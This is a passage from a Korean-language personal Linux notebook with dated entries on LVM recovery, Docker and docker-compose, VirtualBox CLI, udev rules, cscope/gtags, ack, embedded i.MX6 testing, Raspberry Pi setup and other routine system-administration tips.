    
    ```text
    $ sudo vgchange -ay mint-vg
    $ sudo e2fsck -y /dev/mint-vg/root
    ```

5.  복구가 제대로 되었는지 확인  
    
    ```text
    $ sudo mount /dev/mint-vg/root /mnt
    ```

6.  Congratuantions ! 1테라가 넘는 자료가 있었는데 복구됨.


#### <span class="section-num">3.130.3</span> 링크 {#링크}

[blog:recover-lvm](http://blog.adamsbros.org/2009/05/30/recover-lvm-volume-groups-and-logical-volumes-without-backups/)  
<http://sergeswin.com/174>  


### <span class="section-num">3.131</span> 공인 아피 주소및 dns 찾기 {#공인-아피-주소및-dns-찾기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-12-17 토 00:30&gt;</span></span>  


#### <span class="section-num">3.131.1</span> 공인 ip 찾기 {#공인-ip-찾기}

```text
$ curl ipinfo.io/ip
```

<http://askubuntu.com/questions/95910/command-for-determining-my-public-ip>  
[tutorialspoint](http://www.tutorialspoint.com/articles/find-my-public-ip-address-from-linux-command-line)  


#### <span class="section-num">3.131.2</span> DNS {#dns}

```text
$ nmcli d[evice] show enp0s31f6|grep IP4.DNS
```

ubuntu trusty 에서는  

```text
$ nmcli d list
```


### <span class="section-num">3.132</span> virtualbox cli 명령어 {#virtualbox-cli-명령어}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-12-17 토 23:51&gt;</span></span>  
QT 기반의 gui 가 있지만 command line 제어가 필요할 때가 있다.  
몇가지를 요약해본다.  


#### <span class="section-num">3.132.1</span> start virtual machine {#start-virtual-machine}

1.   vrde on

    rdp 로 연결하기 위해서는 vrde 서버를 on 하여야 한다  
    
    ```text
    $ VBoxManage modifyvm --vrde on
    ```

2.   start

    ```text
    $ VBoxManage startvm win10 --type headless
    또는
    $ VBoxHeadless -s win10 &
    ```

3.   usb attach

    ```text
    VBoxManage controlvm <VM> usbattach <ID>
    VBoxManage controlvm <VM> usbdetach <ID>
    ```
    
    ```text
    $ VBoxManage list vms
    $ VBoxManage list usbhost
    $ VBoxManage controlvm win7-64 usbattach b74a5f49-a361-4f52-a603-91cc60549d11
    $ VBoxManage controlvm win7-64 usbdetach b74a5f49-a361-4f52-a603-91cc60549d11
    ```


#### <span class="section-num">3.132.2</span> control virtual machine {#control-virtual-machine}

1.   poweroff

    ```text
    $ VBoxManage controlvm win10 poweroff
    ```

2.   save session

    ```text
    $ VBoxManage controlvm win10 savestate
    ```


### <span class="section-num">3.133</span> ntopng {#ntopng}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-12-18 일 01:27&gt;</span></span>  
linux network 모니터링 tool. ntop 의 업그레이드된 버전이다.  

```text
$ sudo apt install ntopng
```

설치후 브라우저에서 3000번 포트로 접속하면 된다.  


### <span class="section-num">3.134</span> Docker {#docker}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-12-20 화 23:35&gt;</span></span>  
가볍고 빠른 가상화 기술. Linux Containers와 Aufs 를 사용하고 go 언어로작성되었다.  


#### <span class="section-num">3.134.1</span> 설치 {#설치}

64bit linux kernel 3.10 이상에서 동작한다.  
아래 사이트 참조  
<https://docs.docker.com/engine/installation/linux>  
설치후 일반 사용자 권한으로 이용하려면 docker 그룹을만들고 사용자를 추가해 주어야 한다.  


#### <span class="section-num">3.134.2</span> 명령어 요약 {#명령어-요약}

1.   docker 이미지 찾기

    <https://registry.hub.docker.com/>  
    명령어에서 찾기도 가능하다  
    
    ```text
    $ docker search gitlab
    ```
    
    docker 데이터 디렉토리는 /var/lib/docker 이다.  
    이곳을 변경하려면 다른 디렉토리에 파일들을옮긴후 link 하거나 docker 시작 옵션에 특정 디렉토리를지정할 수 있다. 단 디렉토리를 옮길 시 반드시 docker를 stop 한후 옮겨야 한다. docker 시작시 이 디렉토리가  
    mount 되기 때문이다.  
    
    ```text
    $ sudo systemctl stop docker
    $ sudo mv /var/lib/docker /mnt/data/
    $ sudo ln -s /mnt/data/docker /var/lib/docker
    ```

2.   docker hub 에서 이미지 받기

    ```text
    $ docker pull gitlab/gitlab-ce
    ```

3.   docker image 제거

    ```text
    $ docker images
    REPOSITORY          TAG                 IMAGE ID      ...
    gitlab/gitlab-ce    latest              119b6ca37943  ...
    gogs/gogs           latest              7cb613259824  ...
    $ docker rmi gitlab/gitlab-ce
    ```

4.   docker image 실행

    docker run <옵션> <이미지 이름> <실행할 파일>  
    주요 옵션  
    -i	: 표준 입력 stdin 을 연 상태로 시작합니다. 사용자 입력을 허가 하는 옵션.  
    -t	: 의사 터미널을 사용하는 것을 허가 하는 옵션입니다.  
    &#x2013;name 	: 컨테이너의 이름을 지정하기 위한 옵션입니다.  
    
    1.   전체 옵션 보기
    
        ```text
        $ doker run --help
        ```
    
    2.   실행 예
    
        ```text
        $ docker run -it --name test_ubuntu ubuntu:12.04 /bin/bash	
        ```
        
        root user 로 실행하기. -u0 옵션 사용  
        
        ```text
        $ docker run -it -u0 cptactionhank/atlassian-jira-software sh
        ```

5.   컨테이너 목록보기

    ```text
    $ docker ps 
    ```
    
    -a 옵션을 지정하면 정지된 콘테이너도 볼 수 있다.  

6.   컨테이너 중지

    ```text
    $ docker stop gitlab/gitlab-ce
    ```

7.   컨테이너 삭제

    ```text
    $ docker rm gitlab/gitlab-ce
    ```


#### <span class="section-num">3.134.3</span> container 이미지 만들기 {#container-이미지-만들기}

컨테이너의 현재 시점을 이미지로 만들 수 있다.  

1.   명령

    docker commit <옵션> <컨테이너 이름> <이미지 이름>:<태그>  
    
    1.   옵션
    
        -a : 이미지를 작성한 작성자 이름을 지정함  
        -m : 이미지 생성과 관련된 로그 메세지를 지정함  

2.   exam

    ```text
    docker commit -a ybgwon -m "add mysql" gogs gogs/gogs:0.1
    ```

3.   backup and restore

    backup  
    
    ```text
    ybgwon@debian:~$ docker container ls
    CONTAINER ID        IMAGE                                          COMMAND                  CREATED             STATUS              PORTS                     NAMES
    6e8c12c9a8db        cptactionhank/atlassian-jira-software:latest   "/docker-entrypoint.…"   20 hours ago        Up 20 hours         0.0.0.0:18080->8080/tcp   naughty_agnesi
    ybgwon@debian:~$ docker commit naughty_agnesi jira_backup
    sha256:9925c5898dade924d51e69b7f9e11d48520f92b4aa8ac481f0f831f77de51018
    ybgwon@debian:~$ docker save jira_backup > jira_backup.tar
    ybgwon@debian:~$ scp jira_backup.tar mint:
    ```
    
    backup 파일 전송한 서버에 로그인 한 다음 복원  
    
    ```text
    ybgwon@mint ~ $ docker load < jira_backup.tar 
    Loaded image: jira_backup:latest
    ybgwon@mint ~ $ docker images
    REPOSITORY                              TAG                 IMAGE ID            CREATED             SIZE
    jira_backup                             latest              9925c5898dad        7 minutes ago       533MB
    cptactionhank/atlassian-jira-software   latest              fff17e8a6278        6 days ago          533MB
    ybgwon@mint ~ $ docker run --detach --publish 18080:8080 jira_backup
    d58161b17f97c4986a6110526c0759b42a78778bd74e53278fa43fe48a3166aa
    ```


#### <span class="section-num">3.134.4</span> Dockerfile 로 이미지 만들기 {#dockerfile-로-이미지-만들기}

1.   Dockerfile exam

    ```text
    $ mkdir ~/src/docker/gogs
    $ cd ~/src/docker/gogs
    $ cat > Dockerfile
    FROM gogs/gogs
    
    RUN apt-get update
    RUN apt-get install -y mysql
    
    CMD ["docker/start.sh /bin"]
    ```

2.   Build

    docker build <옵션> <Dockerfile 경로>  
    &#x2013;tag 옵션으로 이미지 이름과 태그를 설정할 수 있다  
    
    ```text
    $ docker build --tag gogs/gogs:0.1 ./
    ```


#### <span class="section-num">3.134.5</span> Volume 사용하기 {#volume-사용하기}

호스트 디렉토리를 공유하기 위해서 -v 옵션을 사용할 수 있다.  
실제 호스트 디렉토리를 mount 한다.  

```text
$ docker run --name=gogs -v /var/gogs:/data gogs/gogs
```

호스트이 /var/gogs 디텍토리를 container 의 /data 디렉토리에  
mount 한다.  

1.   Backup

    volume 을 생성하여 사용하다가 백업을 하고자 할 때 따로간단한(?) 방법이 없다. 적당한 디렉토리를 volume 디렉토리로생성하여 tar 로 묶음 파일을 생성한다.  
    -u0 옵션은 권한이 안맞아 root 사용자로 실행하기 위함이고  
    -w / 는 디렉토리가 맞지 않아 실행이 안되어서 넣은 것이다.  
    
    ```text
    $ docker run -u0 -w / --rm --volumes-from jira -v $(pwd):/backup cptactionhank/atlassian-jira-software:latest tar cvf /backup/backup.tar /opt/atlassian/jira
    ```

2.   Restore

    복구는 생성한 volume 에 백업한 파일을 추출한 다음 컨테이너를 생성하는방법으로 한다.  
    
    ```text
    $ docker run --rm -v jira-vol:/backup-ori -v $(pwd):/backup jira-backup bash -c "cd /backup-ori && tar xvf /backup/backup.tar --strip 1"
    $ docker run --detach --publish 18080:8080 --name jira -v jira-vol:/var/atlassian/jira/ jira-backup
    ```

3.   링크

    <https://docs.docker.com/storage/volumes/>  
    <http://khmel.org/?p=1213>  
    <https://blog.ssdnodes.com/blog/docker-backup-volumes/>  


#### <span class="section-num">3.134.6</span> 포트 Publish 사용하기 {#포트-publish-사용하기}

container 포트를 호스트 포트에 포워딩 하는 옵션인데 publish로표현하고 있다.  

```text
$ docker run --name=gogs -p 10022:22 -p 10080:3000 gogs/gogs
```

호스트의 10022 포트로 접속하면 컨테이너의 22번 포트,  
호스트의 10080 포트로 접속하면 컨테이너의 3000번 포트로 연결된다.  


#### <span class="section-num">3.134.7</span> 볼륨 컨테이너 사용하기 {#볼륨-컨테이너-사용하기}

관리의 이점을 위해서 볼륨 컨테이너를 만들고 다른 컨테이너들이볼륨 컨네이너들이 이를 사용하는 방식이다.  
&#x2013;volumes-from 옵션을 사용하여 볼륨 컨테이너를 지정하면볼륨 컨네이너의 공유 디렉토리에 접근할 수 있다.  

1.   볼륨 컨네이터 만들기

    ```text
    $ docker run --name volcon -i-t -v /data1:/user1 \
    -v /data2:/user2 busybox echo "start"
    ```

2.   볼륨 컨네이터 사용하기

    ```text
    $ docker run --name test --volumes-from volcon -it busybox
    $ ls /user1
    ...
    $ ls /user2
    ...
    ```


#### <span class="section-num">3.134.8</span> Docker compose {#docker-compose}

1.   설치

    ```text
    $ sudo curl -L https://github.com/docker/compose/releases/download/1.21.0/docker-compose-$(uname -s)-$(uname -m) -o /usr/local/bin/docker-compose
    $ sudo chmod +x /usr/local/bin/docker-compose
    $ docker-compose --version
    ```
    
    <https://docs.docker.com/compose/install/#install-compose>  

2.   docker-compose.yml 파일 만들기

    ```text
    web:
      image: 'gitlab/gitlab-ce:latest'
      restart: always
      hostname: 'gitlab.example.com'
      environment:
        GITLAB_OMNIBUS_CONFIG: |
          external_url 'https://gitlab.example.com'
          # Add any other gitlab.rb configuration here, each on its own line
      ports:
        - '10080:80'
        - '10022:22'
      volumes:
        - '/srv/gitlab/config:/etc/gitlab'
        - '/srv/gitlab/logs:/var/log/gitlab'
        - '/srv/gitlab/data:/var/opt/gitlab'
    ```

3.   docker-compose.yml 파일이 있는 디렉토리에서 실행

    ```text
    $ docker-compose up -d
    ```


### <span class="section-num">3.135</span> gogs {#gogs}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-12-21 수 01:06&gt;</span></span>  
설치형 git server 로서 gitlab 에 비해 가볍고 빠르다.  
docker 설치를 제공하고 있다.  

```text
# Pull image from Docker Hub.
$ docker pull gogs/gogs

# Create local directory for volume.
$ mkdir -p /mnt/lv_data2/docker/gogs

# Use `docker run` for the first time.
$ docker run --name=gogs -p 10022:22 -p 10080:3000 \
-v /mnt/lv_data2/docker/gogs:/data gogs/gogs
# Use `docker start` if you have stopped it.
$ docker start gogs
```

<https://github.com/gogits/gogs/tree/master/docker>  


### <span class="section-num">3.136</span> tar 묶어서 바로 풀기 {#tar-묶어서-바로-풀기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-02-09 목 13:18&gt;</span></span>  
디렉토리 파일들을 묶어서 특정 디렉토리에 바로 풀때  

```text
$ tar cv . | tar xv -C ../tmp
```


### <span class="section-num">3.137</span> automount disable {#automount-disable}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-03-08 수 17:17&gt;</span></span>  

1.  set media-handling automount false  
    1.  gnome user  
        
        ```text
        $ gsettings set org.gnome.desktop.media-handling automount false
        ```
    2.  mate user  
        
        ```text
        gsettings set org.mate.media-handling automount false
        ```
        
        데비안에서는 mate desktop이더라도  
        org.gnome.desktop.media-handling 부분을 함께 false로 처리해야했다.
    3.  Menu -> Preference -> File Management -> Media  
        -   Check : Never prompt or start program on media insertion
        -   Uncehck : Browse media when inserted


### <span class="section-num">3.138</span> beep {#beep}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-03-09 목 13:59&gt;</span></span>  
pc에 있는 조그만 스피커를 이용하여 비프음을 내는 프로그램이다.  
pcspkr 모듈이 로드되어 있는지 확인하고 beep 명령을 내려주면 된다.  

```text
$ sudo modprobe pcspkr
$ beep -r 3 -f 2000
```

-r 옵션은 반복 -f 옵션은 높낮이다. 메뉴얼 참고  
<https://wiki.archlinux.org/index.php/PC%5Fspeaker>  


### <span class="section-num">3.139</span> nfs mount option {#nfs-mount-option}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-03-14 화 16:24&gt;</span></span>  

```text
$ mount -t nfs -o nolock 192.168.0.2:/srv/nfs /mnt/nfs
mount.nfs: an incorrect mount option was specified
```

위와 같은 에러가 나면서 nfs mount가 되지 않을때 nfsvers  
옵션을 추가하여 mount 한다.  

```text
$ mount -t nfs -o nolock,nfsvers=3 192.168.0.2:/srv/nfs /mnt/nfs
```

<https://forums.gentoo.org/viewtopic-t-875153-start-0.html>  


### <span class="section-num">3.140</span> udev 를 이용한 static device name 만들기 {#udev-를-이용한-static-device-name-만들기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-03-15 수 17:48&gt;</span></span>  
udev를 이용하여 usb hub 의 각 포트마다 고정된 이름을 부여하는방법이다.  

1.  먼저 디바이스 정보를 확인한다.  
    
    ```text
    $ udevadm info --name=/dev/sdb --attribute-walk
    looking at device '/devices/pci0000:00/0000:00:14.0/usb1/1-1/1-1.1/1-1.1.1/1-1.1.1.1/1-1.1.1.1:1.0/host183/target183:0:0/183:0:0:0/block/sdb':
    KERNEL=="sdb"
    SUBSYSTEM=="block"
    DRIVER==""
    ...
    KERNELS=="1-1.1.1.1"
    SUBSYSTEMS=="usb"
    DRIVERS=="usb"
    ATTRS{bDeviceSubClass}=="00"
    ATTRS{bDeviceProtocol}=="00"
    ATTRS{devpath}=="1.1.1.1"
    ATTRS{idVendor}=="0781"
    ```
2.  udev rules 파일 작성  
    
    ```text
    $ cat > /etc/udev/rules.d/80-usbstick.rules
    KERNEL=="sd*", KERNELS=="1-1.2", ATTRS{devpath}=="1.2",  SYMLINK+="ustick1-%n"
    KERNEL=="sd*", KERNELS=="1-1.3", ATTRS{devpath}=="1.3",  SYMLINK+="ustick2-%n"
    KERNEL=="sd*", KERNELS=="1-1.1.1.1", ATTRS{devpath}=="1.1.1.1",  SYMLINK+="ustick10-%n"
    ```
3.  rescan sysfs  
    
    ```text
    $ sudo udevadm control --reload-rules && sudo udevadm trigger
    ```
4.  링크  
    <https://wiki.archlinux.org/index.php/Udev#Setting%5Fstatic%5Fdevice%5Fnames>


### <span class="section-num">3.141</span> Network performance test {#network-performance-test}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-03-15 수 22:13&gt;</span></span>  
네트워크 성능 측정 툴이다.  

1.  install iperf  
    
    ```text
    $ apt install iperf
    ```
2.  server  
    
    ```text
    $ iperf -s
    ```
3.  client  
    
    ```text
    $ iperf -c 192.168.0.2 -t 60 -i 10
    ```
4.  링크  
    <http://www.imx6rex.com/software/imx6-rex-basic-hw-verification-tests/#wifi%5F4965>


### <span class="section-num">3.142</span> CONFIG\_CFG80211\_INTERNAL\_REGDB {#config-cfg80211-internal-regdb}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-03-16 목 17:21&gt;</span></span>  
커널 config 옵션에 CONFIG\_CFG80211\_INTERNAL\_REGDB 라는 것이 있다.  
무선랜 관련 설정인데 default 로 disable 하고 배포판의 CRDA 패키지를사용하라고 되어 있다.  
임베디드 디바이스에서 CRDA패키지가 설치되어 있지 않다면이 옵션을 enable 하고  
git://git.kernel.org/pub/scm/linux/kernel/git/linville/wireless-regdb.git  
에서 db.txt 파일을 kernel-src/net/wireless 아래 복사한 다음커널을 빌드하면 된다.  
db.txt 파일에서 KR 부분만 추출하여 복사해도 된다.  

```text
country KR: DFS-JP
	(2402 - 2482 @ 40), (20)
	(5170 - 5250 @ 80), (20), AUTO-BW
	(5250 - 5330 @ 80), (20), DFS, AUTO-BW
	(5490 - 5710 @ 160), (30), DFS
	(5735 - 5835 @ 80), (30)
```


#### <span class="section-num">3.142.1</span> 중요 {#중요}

imx6 l4.1.15\_2.0.0 커널에서 위 설정이 필요하지 않다.  
crda 패키지 없이 CONFIG\_CFG80211\_INTERNAL\_REGDB 설정하지않았을 때 더 잘된다.  
커널이 업그레이드되면서 이 부분이 필요없어진 듯 하다.  


### <span class="section-num">3.143</span> tags 사용법 {#tags-사용법}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-03-23 목 11:55&gt;</span></span>  


#### <span class="section-num">3.143.1</span> cscope {#cscope}

file index를 하기위해 필요한 파일 리스트를 만들어야하는데 find 나 ack를 사용한다.  

1.   file list 만들기

    1.  find  
        
        ```text
        $ find -L `pwd` -iname "*.c" -o -iname "*.h" > cscope.files
        $ find -L /usr/src/linux-headers-3.19.0-15-generic/ -iname '*.h' -exec realpath {} \; >> cscope.files
        ```
    2.  ack  
        
        ```text
        $ ack -f --cc > cscope.files
        ```
    3.  emacs  
        C-c s I 명령으로 list 와 index를 만들 수 있지만  
        symbolic link 를 따라 가지는 않는다.
    4.  linux kernel  
        
        ```text
        $ make cscope
        ```
        
        symbolic link 를 따라 가게 하려면 scripts/tags.sh 파일에서  
        find 명령어에 -L flag를 추가해야 한다.  
        
        ```text
        --- a/scripts/tags.sh
        +++ b/scripts/tags.sh
        @@ -48,7 +48,7 @@ find_arch_sources()
             for i in $archincludedir; do
         	     prune="$prune -wholename $i -prune -o"
             done
        -	find ${tree}arch/$1 $ignore $prune -name "$2" -print;
        +	find -L ${tree}arch/$1 $ignore $prune -name "$2" -print;
        }
        
        # find sources in arch/$1/include
        @@ -57,21 +57,21 @@ find_arch_include_sources()
             include=$(find ${tree}arch/$1/ -name include -type d);
             if [ -n "$include" ]; then
         	     archincludedir="$archincludedir $include"
        -		find $include $ignore -name "$2" -print;
        +		find -L $include $ignore -name "$2" -print;
             fi
        }
        
        # find sources in include/
        find_include_sources()
        {
        -	find ${tree}include $ignore -name config -prune -o -name "$1" -print;
        +	find -L ${tree}include $ignore -name config -prune -o -name "$1" -print;
        }
        
        # find sources in rest of tree
        # we could benefit from a list of dirs to search in here
        find_other_sources()
        {
        -	find ${tree}* $ignore \
        +	find -L ${tree}* $ignore \
         	  \( -name include -o -name arch -o -name '.tmp_*' \) -prune -o \
         	    -name "$1" -print;
        }
        ```
    5.  kernel Makefile  
        
        ```text
        $ make -j8 ARCH=arm64 cscope
        ```
    6.  shell script  
        
        ```text
        #!/bin/bash
        LNX="."
        ARCH=arm64
        
        echo "Finding relevant source files..."
        find $LNX                                                                   \
             -path "$LNX/arch/*" ! -path "$LNX/arch/$ARCH*" -prune -o               \
             -path "$LNX/include/asm-*" ! -path "$LNX/include/asm-generic*"         \
                                        ! -path "$LNX/include/asm-$ARCH*" -prune -o \
             -path "$LNX/tmp*" -prune -o                                            \
             -path "$LNX/Documentation*" -prune -o                                  \
             -path "$LNX/scripts*" -prune -o                                        \
             -name "*.[chxsS]" -print > $LNX/cscope.files
        
        echo "Building cscope database..."
        time cscope -q -k -b -i cscope.files
        
        exit 0
        ```

2.   indexing

    ```text
    $ cscope -Rbq
    커널 소스에서는 -k 옵션을 켜는 것이 유효한 지는 므르겠다.
    -k  Kernel Mode, turns off the use of the default include dir.
        (usually  /usr/include) when building the database, since kernel
        source trees generally do not use it.
    ```

3.   링크

    <https://pinocc.tistory.com/154>  
    <http://stackoverflow.com/questions/29518681/cscope-for-files-which-are-symlinks>  
    <https://courses.cs.washington.edu/courses/cse451/12sp/tutorials/tutorial%5Fcscope.html>  


#### <span class="section-num">3.143.2</span> gtags {#gtags}

1.   make tag

    ```text
    $ gtags
    ```
    
    list file 을 지정할 수 있다.  
    
    ```text
    $ ack-grep -f --cc > list
    $ gtags -f list
    ```
    
    tags 파일을 다른 디렉토리에 저장할 수 있다.  
    
    ```text
    $ mkdir /var/dbpath
    $ cd /cdrom/src                 # the root of source tree
    $ gtags /var/dbpath             # make tag files in /var/dbpath
    $ export GTAGSROOT=`pwd`
    $ export GTAGSDBPATH=/var/dbpath
    $ global func
    ```

2.   외부 디렉토리 추가

    1.   GTAGSLIBPATH 환경변수 설정
    
        ```text
        $ pwd
        /develop/src/mh                 # this is a source project
        $ gtags
        $ ls G*TAGS
        GRTAGS  GTAGS
        $ global mhl
        uip/mhlsbr.c                    # mhl() is found
        $ global strlen                 # strlen() is not found
        $ (cd /usr/src/lib; gtags)      # library source
        $ (cd /usr/src/sys; gtags)      # kernel source
        $ export GTAGSLIBPATH=/usr/src/lib:/usr/src/sys
        $ global strlen
        ../../../usr/src/lib/libc/string/strlen.c  # found in library
        $ global access
        ../../../usr/src/sys/kern/vfs_syscalls.c   # found in kernel
        ```
    
    2.   심볼릭 링크 이용
    
        ```text
        $ ln -s /usr/src/lib .
        $ ln -s /usr/src/sys .
        $ gtags
        $ global strlen
        lib/libc/string/strlen.c
        $ global access
        sys/kern/vfs_syscalls.c
        ```
    
    3.   emacs
    
        ggtags 패키지 설치  
        emacs config 에 아래를 추가하거나 M-x ggtags-mode  
        
        ```text
        (add-hook 'c-mode-common-hook
                  (lambda ()
                    (when (derived-mode-p 'c-mode 'c++-mode 'java-mode)
                      (ggtags-mode 1))))
        ```
    
    4.   링크
    
        <https://github.com/leoliu/ggtags>  
        <https://www.gnu.org/software/global/globaldoc%5Ftoc.html>  


### <span class="section-num">3.144</span> ack {#ack}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-03-23 목 14:07&gt;</span></span>  
프로그래머를 위한 grep tool 이다. perl 로 작성되었다.  


#### <span class="section-num">3.144.1</span> rc 파일 {#rc-파일}

```text
$ cat > ~/.ackrc
--ignore-case
```


#### <span class="section-num">3.144.2</span> 사용법 {#사용법}

ack-grep [OPTION]&#x2026; PATTERN [FILES OR DIRECTORIES]  

```text
$ ack-grep -i select
```

display know types  

```text
$ ack-grep --help-types
```


#### <span class="section-num">3.144.3</span> c 소스 파일 찾기 {#c-소스-파일-찾기}

```text
$ ack-grep -f --cc
```


#### <span class="section-num">3.144.4</span> Change all "this" to "that" in all Perl files in a tree. {#change-all-this-to-that-in-all-perl-files-in-a-tree-dot}

```text
$ ack-grep -f --perl | xargs perl -p -i -e's/this/that/g'
```


#### <span class="section-num">3.144.5</span> 링크 {#링크}

<https://beyondgrep.com/>  


### <span class="section-num">3.145</span> ag {#ag}

c로 작성한 ack tool 이다. 빠르다.  


#### <span class="section-num">3.145.1</span> 사용법 {#사용법}

ag [OPTIONS] PATTERN [PATH]  

```text
$ ag -i foo /bar/
```


### <span class="section-num">3.146</span> shell colored output {#shell-colored-output}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-03-24 금 13:52&gt;</span></span>  


#### <span class="section-num">3.146.1</span> grammer {#grammer}

```text
escapecode + [ + style + ; + color + m
```

1.   escapecode

    ```text
    \e[ 또는 \033 또는 \x1B
    ```

2.   style

3.   ANSI Color Code

4.   nocolor(reset)

    ```text
    \e[0m
    ```

5.   exam

    1.  normal red color  
        
        ```text
        $ echo -e "\e[0;31mhello\e[0m world"
        ```
    2.  underline green color  
        
        ```text
        $ echo -e "\e[4;32mhello\e[0m world"
        ```


### <span class="section-num">3.147</span> memtester {#memtester}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-04-17 월 12:41&gt;</span></span>  
arm 에서 ddr 메모리 test를 위한 과정이다.  

1.  소스를 받아온다.  
    
    ```text
    $ apt-get source memtester
    ```
2.  cross 컴파일 한다.  
    conf-cc 파일과 conf-ld 파일의 cc 값을 arm-linux-gcc 로변경한다.  
    
    ```text
    $ make
    ```
3.  사용법  
    
    ```text
    Usage: memtester [-p physaddrbase [-d device]] <mem>[B|K|M|G] [loops]
    ```
    
    보통 명령어 다음에 테스트 메모리 사이즈를 적어준다. 메모리 사이즈는  
    free 명령어로 가용한 메모리 용량을 알아낸후 그보다 몇십메가 아래사이즈를 지정한다. 기본 옵션은 megabytes 에 무한루프이다.  
    
    ```text
    $ ./memtester 730
    ```


### <span class="section-num">3.148</span> imx6 cpu 열 관련 {#imx6-cpu-열-관련}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-04-28 금 10:30&gt;</span></span>  

1.  cpu 온도  
    
    ```text
    $ cat /sys/class/thermal/thermal_zone0/temp
    ```
2.  passive point  
    passive point 진입 온도. 이 온도을 넘어서면 cpu, gpu 주파수를 낮춘다.  
    
    ```text
    $ cat /sys/class/thermal/thermal_zone0/trip_point_0_temp
    ```
3.  critical point  
    critical point 진입 온도.  이 온도를 넘어서면 장비를 리부팅한다.  
    
    ```text
    $ cat /sys/class/thermal/thermal_zone0/trip_point_1_temp
    ```
4.  온도가 passive point 보다 10도 내려가면 냉각장치는 동작을 해제한다.


### <span class="section-num">3.149</span> imx ddr stress test from u-boot {#imx-ddr-stress-test-from-u-boot}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-04-28 금 11:09&gt;</span></span>  
sdcard 나 emmc의 fat 파티션에 ddr-test-uboot-jtag-mx6dq.bin을복사한다.  

```text
u-boot> dcache off
u-boot> icache off
u-boot> fatload mmc 1:1 0x00907000 ddr/ddr-test-uboot-jtag-mx6dq.bin
u-boot> go 0x00907000
```


### <span class="section-num">3.150</span> gdb arguments 사용 {#gdb-arguments-사용}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-05-04 목 17:36&gt;</span></span>  

1.  command line 에서  
    
    ```text
    $ gdb --args prog arg1 arg2
    ```
2.  gdb 실행후  
    
    ```text
    $ gdb prog
    (gdb) r arg1 arg2 
    ```


### <span class="section-num">3.151</span> cpu 정보 {#cpu-정보}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-05-11 목 14:17&gt;</span></span>  

1.  proc 파일시스템에서 찾기  
    
    ```text
    $ cat /proc/cpuinfo
    
    $ cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq
    ```

2.  명령어  
    
    ```text
    $ lscpu
    
    $ hwinfo --cpu 
    
    $ sudo dmidecode -t processor
    ```


### <span class="section-num">3.152</span> Raspberry Pi {#raspberry-pi}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-05-19 금 13:22&gt;</span></span>  


#### <span class="section-num">3.152.1</span> CLI {#cli}

1.  설치  
    -   NOOBS  
        1.  8GB micro sdcard 를 준비하여 파티션을 하나만 잡고 fat32로포맷한다.  
            
            ```text
            $ fdisk /dev/sdb
            select partition type b. w95 fat32 and write
            $ mkfs.vfat /dev/sdb1
            ```
            
            <http://qdosmsq.dunbar-it.co.uk/blog/2013/06/noobs-for-raspberry-pi/>
        2.  NOOBS OS installer 를 sdcard 에 라이팅한다.  
            
            ```text
            $ sudo mount /dev/sdb1 /mnt/sd
            $ c /mnt/sd
            $ sudo unzip ~/data/NOOBS_v2_4_0.zip 
            ```
        3.  리부팅후 설치 프로세서를 따라 진행한다.
    -   RASPBIAN  
        
        ```text
        $ sudo dd if=/dev/sdd of=sdcard.img bs=4M conv=fsync status=progress
        ```
        
        [raspberrypi.org](https://www.raspberrypi.org/documentation/installation/installing-images/linux.md)
2.  설정  
    
    ```text
    $ sudo raspi-config
    ```
3.  펌웨어 업그레이드  
    
    ```text
    $ sudo rpi-update
    ```
4.  webcam  
    
    ```text
    $ sudo apt-get install fswebcam
    $ fswebcam -r 1280x720 image.jpg
    ```
5.  camera module  
    1.  still 캡쳐  
        2초후 캡쳐  
        
        ```text
        $ raspistill -t 2000 -o test.jpg
        ```
        
        30초동안 5초마다 캡쳐  
        
        ```text
        $ raspistill -t 30000 -tl 5000 -o image_%03d.jpg
        ```
    2.  video capture  
        30초동안  
        
        ```text
        $ raspivid -v -t 30000 -o test.h264
        ```
        
        <https://www.raspberrypi.org/documentation/raspbian/applications/camera.md>
    3.  python 모듈 사용하기  
        <https://www.raspberrypi.org/documentation/usage/camera/python/README.md>

6.  Disable onboard Wifi and BT  
    Edit /boot/config.txt  
    
    ```text
    dtoverlay=pi3-disable-wifi
    dtoverlay=pi3-disable-bt
    ```


### <span class="section-num">3.153</span> passwd length {#passwd-length}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-06-01 목 19:55&gt;</span></span>  
/etc/shadow 파일의 passwd 필드가 \\(num\\) 로 시작하면 암호와 해쉬를사용하고 있고 패스워드 길이에 제한이 없다. 그렇지 않다면  
DES 알고리즘을 사용하는 것이고 8자 길이 제한이 된다.  
오래된 busybox 에는 기본으로 DES 알고리즘을 사용하는 시스템이있다. -a 옵션을 사용하여 기본 알고리즘을 수정할 수 있다.  

```text
root@NEXELL:~# passwd --help
BusyBox v1.23.1 (2017-01-13 17:16:33 KST) multi-call binary.

Usage: passwd [OPTIONS] [USER]

Change USER's password (default: current user)

        -a ALG  Encryption method
        -d      Set password to ''
        -l      Lock (disable) account
        -u      Unlock (enable) account

root@NEXELL:~# passwd -a sha512
```

[superuser](https://superuser.com/questions/148971/what-is-the-max-length-of-password-on-unix-linux-system)  


### <span class="section-num">3.154</span> HiDPI 설정 {#hidpi-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-06-29 목 15:54&gt;</span></span>  

1.  dpi 설정 변경  
    Menu -> preferences -> Appearence -> Fonts -> Details -> Resolution  
    96 에서 120으로 변경
